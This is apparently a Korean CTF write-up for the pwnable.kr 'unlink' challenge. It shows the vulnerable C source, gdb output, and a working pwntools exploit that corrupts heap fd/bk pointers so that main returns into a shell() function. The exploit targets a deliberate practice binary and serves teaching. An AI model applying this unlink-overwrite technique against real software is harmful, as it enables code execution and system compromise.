---
sort: 19
---

# unlink

home 디렉토리에 unlink.c파일에 소스코드가 들어있다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
        struct tagOBJ* fd;
        struct tagOBJ* bk;
        char buf[8];
}OBJ;

void shell(){
        system("/bin/sh");
}

void unlink(OBJ* P){
        OBJ* BK;
        OBJ* FD;
        BK=P->bk;
        FD=P->fd;
        FD->bk=BK;
        BK->fd=FD;
}
int main(int argc, char* argv[]){
        malloc(1024);
        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
        OBJ* C = (OBJ*)malloc(sizeof(OBJ));

        // double linked list: A <-> B <-> C
        A->fd = B;
        B->bk = A;
        B->fd = C;
        C->bk = B;

        printf("here is stack address leak: %p\n", &A);
        printf("here is heap address leak: %p\n", A);
        printf("now that you have leaks, get shell!\n");
        // heap overflow!
        gets(A->buf);

        // exploit this unlink!
        unlink(B);
        return 0;
}
```

OBJ A, B, C의 크기가 같은데 연속적으로 malloc을 했기 때문에 heap상에서 가까이 있을 것 같다.<br>
또한 A->buf를 gets가지고 받고있기 때문에 buffer overflow를 통해서 object의 fd, bk 포인터를 변조해서 unlink를 할 때 프로그램의 흐름을 변경시킬 수 있을 것 같다.<br><br>
c코드만 봐서는 이 문제 못푼다. main을 disassemble해야 문제를 풀 수 있다. c코드에는 나와있지 않은 코드부분이 존재하기 때문이다.

```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x0804852f <+0>:     lea    0x4(%esp),%ecx
   0x08048533 <+4>:     and    $0xfffffff0,%esp
   0x08048536 <+7>:     pushl  -0x4(%ecx)
   0x08048539 <+10>:    push   %ebp

   ... (중략) ...

   0x080485fa <+203>:   mov    $0x0,%eax
   0x080485ff <+208>:   mov    -0x4(%ebp),%ecx
   0x08048602 <+211>:   leave
   0x08048603 <+212>:   lea    -0x4(%ecx),%esp
   0x08048606 <+215>:   ret
```

main함수의 첫부분과 끝부분에 희한한 가젯이 존재한다. 이를 이용해야 문제를 풀 수 있다.<br>
잘 보면 ebp - 4에 위치한 값을 ecx로 옮기고, ecx - 4에 위치한 값을 esp로 옮긴 뒤에 ret를 때리는 것을 확인할 수 있다. 따라서 ebp - 4에 저장되어있는 값을 조진다면 프로그램의 흐름을 변경시킬 수 있다.<br>
아래 그림과 같이 변조하면 main함수가 종료되고 ret될 때 shell함수를 실행시킬 수 있다.

<img src="/picture/pwnable.kr/unlink.png" width="1000"/>

```gdb
(gdb) b* 0x080485e4
Breakpoint 1 at 0x80485e4
(gdb) r
Starting program: /home/unlink/unlink
here is stack address leak: 0xffad9c64
here is heap address leak: 0x8464410
now that you have leaks, get shell!

Breakpoint 1, 0x080485e4 in main ()
(gdb) x/20wx 0x8464410
0x8464410:      0x08464428      0x00000000      0x00000000      0x00000000
0x8464420:      0x00000000      0x00000019      0x08464440      0x08464410
0x8464430:      0x00000000      0x00000000      0x00000000      0x00000019
0x8464440:      0x00000000      0x08464428      0x00000000      0x00000000
0x8464450:      0x00000000      0x00000409      0x20776f6e      0x74616874

(gdb) i r ebp
ebp            0xffad9c78       0xffad9c78
```

위와 같이 A, B, C 주소값이 0x18씩 나는 것과, stack 내의 지역변수 A와 ebp사이의 간격이 0x14인 것을 알아내었다.<br>
따라서 payload를 아래와 같이 짜면 된다.

```python
from pwn import *

p = process("/home/unlink/unlink")
print(p.recvuntil(": "))
stack_addr = int(p.recvuntil("\n")[:-1], 16)

print(p.recvuntil(": "))
heap_addr = int(p.recvuntil("\n")[:-1], 16)

print(p.recvline())

#              shell()      padding   B->fd = A->buf[4]의 주소  B->bk = main의 ebp - 4
p.sendline(p32(0x080484eb) + "A"*12 + p32(heap_addr + 12) + p32(stack_addr + 16))
p.interactive()
```

```bash
unlink@pwnable:/tmp/dlfjs123$ python script.py
[+] Starting local process '/home/unlink/unlink': pid 406493
here is stack address leak:
here is heap address leak:
now that you have leaks, get shell!

[*] Switching to interactive mode
$ cat ~/flag
```

```tip
## 알게 된 점

c코드만 보지 말고 어셈도 보자.
```